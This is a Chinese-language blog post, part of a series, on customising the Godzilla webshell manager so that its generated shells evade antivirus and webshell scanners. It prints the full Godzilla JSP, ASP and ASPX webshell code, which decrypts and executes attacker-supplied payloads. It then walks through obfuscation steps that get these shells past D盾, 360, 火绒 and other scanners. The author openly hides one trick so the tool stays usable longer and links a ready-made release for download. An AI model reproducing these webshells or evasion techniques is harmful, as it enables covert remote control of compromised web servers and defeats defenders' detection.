<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125180031255.png" alt="image-20241125180031255"></p>
<p>下面的评论中，也写了，单文件不好过阿里云了。需要分离了。笔者太菜了，后面在研究。</p>
<p>接下来看下半部分，在看了大量哥斯拉免杀马的教程后发现，d盾我也没过去。下面就记录一下。</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = base64Decode(request.getParameter(pass));</span><br><span class="line">        data = x(data, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> X(<span class="keyword">this</span>.getClass().getClassLoader()).Q(data));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">            java.io.ByteArrayOutputStream arrOut = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">            Object f = ((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">            f.equals(arrOut);</span><br><span class="line">            f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">            f.toString();</span><br><span class="line">            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="keyword">true</span>)));</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>这是下半部分，主要的查杀点是<code>session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</code></p>
<p>准确的来说是getClassLoader这个字符串。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126114939630.png" alt="image-20241126114939630"></p>
<p>这里直接将这个字符串删掉，完全没有问题。</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/386231.html">https://www.freebuf.com/sectool/386231.html</a></p>
<p>在这篇大师傅的文章中说，将<code>this.getClass().getClassLoader() 可替换为Thread.currentThread().getContextClassLoader()</code></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115039932.png" alt="image-20241126115039932"></p>
<p>但是，我们惊奇的发现，getContextClassLoader()  也是存在ClassLoader 所以过不去。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115332909.png" alt="image-20241126115332909"></p>
<p>为了gpt，发现，无论怎么获取，都需要有ClassLoader()这个字符，那么就走到了死胡同。</p>
<p>还有一种方法，就是自己写了，那么我们先搁下，后面在研究（其实就是笔者不会，等我研究研究的）。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115454282.png" alt="image-20241126115454282"></p>
<p>那么还有一种方法就是混淆了，混淆就是用unicode编码。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115901247.png" alt="image-20241126115901247"></p>
<p>但是你会发现，有unicode编码。  直接就报，也不管里面是啥。所以暂时我的路给堵死了。</p>
<p>最后我们就用unicode编码吧，报就报吧，总比报可疑好看一点。</p>
<p>这样的话，我们的模板就写好了。</p>
<p>试试火绒和360 ，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126145648688.png" alt="image-20241126145648688"></p>
<p>这里传值的时候，是payload就不行，火绒和360都报，</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126145952249.png" alt="image-20241126145952249"></p>
<p>随便写个字符串，即可了。在改改变量名，就不演示了。好，这一我们的模板就彻底完事了。</p>
<p>放到哥斯拉里的bin文件就行。</p>
<p>当然，我们的bin文件需要改一改。由于，哥斯拉默认jsp形式的生成代码是两段，所以我们需要都改一下</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127112917794.png" alt="image-20241127112917794"></p>
<p>把这些str写一下，在主generate中，写一些字符串，然后在生成代码时候进行替换就可以了。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113002060.png" alt="image-20241127113002060"></p>
<p>这个活看起来确实不是很难，但是需要很细，改了一天，错一点又要重新删了在替换，心态快崩了。</p>
<p>这里细心的同学会发现，我将原本默认的哥斯拉生成的pass 和 key进行base64了。</p>
<p>就是在这个地方</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113248451.png" alt="image-20241127113248451"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113341743.png" alt="image-20241127113341743"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113548405.png" alt="image-20241127113548405"></p>
<p>在生成木马中，就找不到原来的pass 和一个16位的字符了，增加一丢丢迷惑性吧</p>
<p>原本的马中，是有md5函数的，但是这个没有，因为用不到，就给删了。</p>
<p>当然，其中也加了一些其他的东西。这里就不细讲了，防止暴漏，能让大家多用一会。</p>
<p>回到免杀，是的，也过掉了d盾，笔者上面说到的  gpt帮我们找了一些函数，但是都有classcload 过不去，其实不是，经过测试发现，这个是有可以代替的。gpt太强了。这里就不写改过哪里了。大家下载了直接用就好。下个版本在揭露，目前我看网上还没有这种用法。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113840202.png" alt="image-20241127113840202"></p>
<p>这样呢，我们就过掉了d盾，希望d盾的作者不要看到这个文章，这样的话，就能一直用了。</p>
<p>好了，这样就可以了。暂时先用着，看下效果。</p>
<p>没次生成的</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127135106715.png" alt="image-20241127135106715"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142342625.png" alt="image-20241127142342625"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142358575-17326886738532.png" alt="image-20241127142358575"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142435205.png" alt="image-20241127142435205"></p>
<p>ok，没有问题，这样jsp的免杀就完成了。大家在使用的时候，尽量别用pass 和key做密码，太明显了。下面咱们来看asp的。</p>
<h5 id="asp-免杀"><a href="#asp-免杀" class="headerlink" title="asp 免杀"></a>asp 免杀</h5><p>先看一下原版的🐎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Set bypassDictionary = Server.CreateObject(&quot;Scripting.Dictionary&quot;)</span><br><span class="line"></span><br><span class="line">Function Base64Decode(ByVal vCode)</span><br><span class="line">    Dim oXML, oNode</span><br><span class="line">    Set oXML = CreateObject(&quot;Msxml2.DOMDocument.3.0&quot;)</span><br><span class="line">    Set oNode = oXML.CreateElement(&quot;base64&quot;)</span><br><span class="line">    oNode.dataType = &quot;bin.base64&quot;</span><br><span class="line">    oNode.text = vCode</span><br><span class="line">    Base64Decode = oNode.nodeTypedValue</span><br><span class="line">    Set oNode = Nothing</span><br><span class="line">    Set oXML = Nothing</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function decryption(content,isBin)</span><br><span class="line">    dim size,i,result,keySize</span><br><span class="line">    keySize = len(key)</span><br><span class="line">    Set BinaryStream = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">    BinaryStream.CharSet = &quot;iso-8859-1&quot;</span><br><span class="line">    BinaryStream.Type = 2</span><br><span class="line">    BinaryStream.Open</span><br><span class="line">    if IsArray(content) then</span><br><span class="line">        size=UBound(content)+1</span><br><span class="line">        For i=1 To size</span><br><span class="line">            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(key,(i mod keySize)+1,1)))</span><br><span class="line">        Next</span><br><span class="line">    end if</span><br><span class="line">    BinaryStream.Position = 0</span><br><span class="line">    if isBin then</span><br><span class="line">        BinaryStream.Type = 1</span><br><span class="line">        decryption=BinaryStream.Read()</span><br><span class="line">    else</span><br><span class="line">        decryption=BinaryStream.ReadText()</span><br><span class="line">    end if</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line">    key=&quot;3c6e0b8a9c15224a&quot;</span><br><span class="line">    content=request.Form(&quot;pass&quot;)</span><br><span class="line">    if not IsEmpty(content) then</span><br><span class="line"></span><br><span class="line">        if  IsEmpty(Session(&quot;payload&quot;)) then</span><br><span class="line">            content=decryption(Base64Decode(content),false)</span><br><span class="line">            Session(&quot;payload&quot;)=content</span><br><span class="line">            response.End</span><br><span class="line">        else</span><br><span class="line">            content=decryption(Base64Decode(content),true)</span><br><span class="line">            bypassDictionary.Add &quot;payload&quot;,Session(&quot;payload&quot;)</span><br><span class="line">            Execute(bypassDictionary(&quot;payload&quot;))</span><br><span class="line">            result=run(content)</span><br><span class="line">            response.Write(&quot;11cd6a&quot;)</span><br><span class="line">            if not IsEmpty(result) then</span><br><span class="line">                response.Write Base64Encode(decryption(result,true))</span><br><span class="line">            end if</span><br><span class="line">            response.Write(&quot;ac826a&quot;)</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们会发现Execute(bypassDictionary(“payload”))  这一句肯定是检查的重点了。经过看文章，一共就三个执行命令的函数，</p>
<p>Eval</p>
<p>Execute</p>
<p>ExecuteGlobal</p>
<p>大概率是不好过了。asp可以使用chr（97）这种方式进行混淆关键字。但是eval这种不可以。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127173004460.png" alt="image-20241127173004460"></p>
<p>类似这种。字符串和chr拼接。</p>
<p>大概这样</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172721137.png" alt="image-20241203172721137"></p>
<p>看一下查杀效果，首先看最强的阿里云</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203171242474.png" alt="image-20241203171242474"></p>
<p>如我们所想，阿里云直接检测EXECUTE，存在即被ban，那这样的话，没啥好办法了，和php的eval一样了。先搁着，后面笔者在学习学习。</p>
<p>微步没问题</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172311267.png" alt="image-20241203172311267"></p>
<p>河马也没问题</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172638930.png" alt="image-20241203172638930"></p>
<p>d盾</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203173204184.png" alt="image-20241203173204184"></p>
<p>360 火绒</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203173743521.png" alt="image-20241203173743521"></p>
<p>那么也就是除了aliyun  其他应该都没啥问题</p>
<p>我们进行简单优化一下，函数和字符串复用一下，尽量少些一点字符。</p>
<p>然后整到到哥斯拉里。替换一下变量名。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091248725.png" alt="image-20241204091248725"></p>
<p>模板也修改一下</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091323827.png" alt="image-20241204091323827"></p>
<p>然后打包试一下效果。生成三个免杀🐎，都不一样。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091723915.png" alt="image-20241204091723915"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204092133180.png" alt="image-20241204092133180"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204092220267.png" alt="image-20241204092220267"></p>
<p>ok，没有任何问题。接下来看aspx。</p>
<h5 id="aspx-免杀"><a href="#aspx-免杀" class="headerlink" title="aspx 免杀"></a>aspx 免杀</h5><p>我们先来看一下aspx的CSHAP_AES_BASE64的🐎</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ PAge LaNgUagE=&quot;C#&quot;%&gt;</span><br><span class="line">&lt;%try &#123; string key = &quot;3c6e0b8a9c15224a&quot;; string pass = &quot;pass&quot;; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(&quot;-&quot;, &quot;&quot;); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session[&quot;payload&quot;] == null) &#123; Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;).Invoke(null, new object[] &#123; data &#125;); ; &#125; else &#123; System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); &#125; &#125; catch (System.Exception) &#123; &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>代码相对较短。应该调用base64比较简单。asp调用base64代码相对较多，代码一度到了60行。大部分都是在加载base64。主要就是将返回的结果aes后进行base64。</p>
<p><code>data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(changshangyi), System.Text.Encoding.Default.GetBytes(changshangyi)).TransformFinalBlock(data, 0, data.Length);</code></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204101405346.png" alt="image-20241204101405346"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204101424781.png" alt="image-20241204101424781"></p>
<p>这一句应该是重要，还有</p>
<p><code>Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));</code></p>
<p>理论上来说关于data处理的都是重要的，d盾都标记了。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204110311317.png" alt="image-20241204110311317"></p>
<p>这个地方定义一个变量传参，或者</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204110338085.png" alt="image-20241204110338085"></p>
<p>直接将aes拆开也行。</p>
<p>现在报可疑。再fuzz一下，哪里可疑。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204114604778.png" alt="RijndaelManaged"></p>
<p>RijndaelManaged 换成AesManaged<br>可疑文件出现在下面这一句话上<br>System.Reflection.MethodInfo loadMethod = assemblyType.GetMethod(“Load”, parameterTypes);</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204115526559.png" alt="image-20241204115526559"></p>
<p>这里还是给他拆开写。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204115615828.png" alt="image-20241204115615828"></p>
<p>这样就可以了。过掉d盾。<br>但是还是有问题，就是显示该文件为单文件aspx，有点丑陋。<br>经过fuzz笔者发现，这个单文件</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134046641.png" alt="image-20241204134046641"></p>
<p>匹配的就是开头的标识ASPX的一个字段，可以是 c、js、Jscript 、CSHARP等</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134500691.png" alt="image-20241204134500691"></p>
<p>没有这个就不报了。<br>经过搜索，这个大师傅已经给出了解决方案。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10937">https://xz.aliyun.com/t/10937</a></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134555743.png" alt="image-20241204134555743"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134705522.png" alt="image-20241204134705522"></p>
<p>放到最后，并且要&lt;% @language=”c#” %&gt;这么写  就可以绕过了。在优化一下key 和 pass  进行编码一下，隐藏起来。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204151737129.png" alt="image-20241204151737129"></p>
<p>来看一下aliyun，还是报恶意，但是这次并没有给出检测的哪里，emmmm，去fuzz的话，相对比较难，就是随便删除代码的话，会报正常，因为阿里云会动态检测，语法不对，就直接报正常了。fuzz的时间相对长一些。先搁置把。<br>微步</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094648151.png" alt="image-20241212094648151"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094657373.png" alt="image-20241212094657373"></p>
<p>360 火绒</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094812882.png" alt="image-20241212094812882"></p>
<p>免杀都没啥问题。<br>这里没有使用其他大师傅那种 unicode编码的免杀，为什么呢，还是在jsp中遇到的，在d盾中，只要有unicode编码，就报可疑，感觉不是很好，所以就没有使用。当然，aspx是可以使用unicode进行免杀的。<br>好开始往里灌，整成动态的。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212163555701.png" alt="image-20241212163555701"></p>
<p>简单写一下，替换code即可。<br>一如既往生成三个。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164351419.png" alt="image-20241212164351419"></p>
<p>可以看到，每次都不一定。</p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164655181.png" alt="image-20241212164655181"></p>
<p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164708818.png" alt="image-20241212164708818"></p>
<p>ok，使用也没问题。这样的话，aspx的免杀也就完成了。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这里也算进行了简单的免杀，全部语言除了 aliyun没有过去，其他的平台基本全过。不得不承认，aliyun是强的。php 简单使用了一下类、对关键字进行了chr的替换，jsp重写了base64编码方法，重写了加载aes，使用的反射型方法写的，对关键字进行替换，asp使用了chr进行替换关键字拼接字符串，换了一下函数的写法，aspx对关键函数拆开重写，并且将关键查杀函数重新写了一下，对关键字base64编码。</p>
<h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>1.1版本添加木马的免杀，全语言都做好了，但是并没有改流量以及加密方式，只是做了伪装，<br>后面需要做的：修改一下加密方式，这样的话会更好一点。还有就是message其实是固定的，希望能让他动起来。还有传递的参数 page=1&amp;size=10 是固定的，让他也动起来。其他语言的 比如  jspf的 ，asmx的都没做，后面做。</p>
<h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a target="_blank" rel="noopener" href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a><br>release 1.1 免杀版本，src代码也以上传，大家直接下载研究即可。<br>上个版本由于写的比较菜，没好意思跟大家要star，这次自我感觉还行，也算是实战能用了，如果感觉还凑合，大家帮忙点点star</p>
<h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。如果您感觉文章写的不错或者工具用起来还行，帮笔者点点stars、给公众号点点关注，先谢谢大家了。</p>
<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            原版哥斯拉</span><br><span class="line">https://github.com/Tas9er/ByPassGodzilla   ByPassGodzilla</span><br><span class="line">https://xz.aliyun.com/t/2758               利用动态二进制加密实现新型一句话木马之.NET篇</span><br><span class="line">https://xz.aliyun.com/t/10937              测试几种实战成功过的webshell的免杀方式</span><br><span class="line">https://xz.aliyun.com/t/11368              实战分析某红队魔改哥斯拉Webshell</span><br><span class="line">https://uuzdaisuki.com/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/                   webshell免杀研究jsp篇</span><br><span class="line">https://www.secpulse.com/archives/193780.html        简单操作实现冰蝎jsp webshell 阿里云免杀 </span><br></pre></td></tr></table></figure>

<blockquote>
<p>emmm 太菜了<br>一直在路上</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/">https://bohemian.top/2024/11/18/哥斯拉二开v1-0/哥斯拉二开从0到1-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/godzilla/">godzilla</a><a class="post-meta__tags" href="/tags/%E4%BA%8C%E5%BC%80/">二开</a></div><div class="post-share"><div class="social-share" data-image="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="哥斯拉二开从0到1"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">哥斯拉二开从0到1</div></div><div class="info-2"><div class="info-item-1">最近学习了一下冰蝎和哥斯拉的二开，但也只是学习了一丢丢皮毛，这里记录一下。  准备php5.2  php7.4 java 1.8 准备工作，这里还是建议使用idea，我用vscode  调，第一步配环境就给我卡死了，调了很久都没有调明白，太菜了。 首先致敬一下原版哥斯拉，原版地址https://github.com/BeichenDream/Godzilla 我们这里使用的最新的v4.0.1-godzilla版本，进行逆向及二开。 反编译网址，https://www.decompiler.com/，直接拖入jar包即可，很方便。 当然也可以使用idea的插件进行反编译，都一样。 ok开始 环境搭建先改个名称试试看 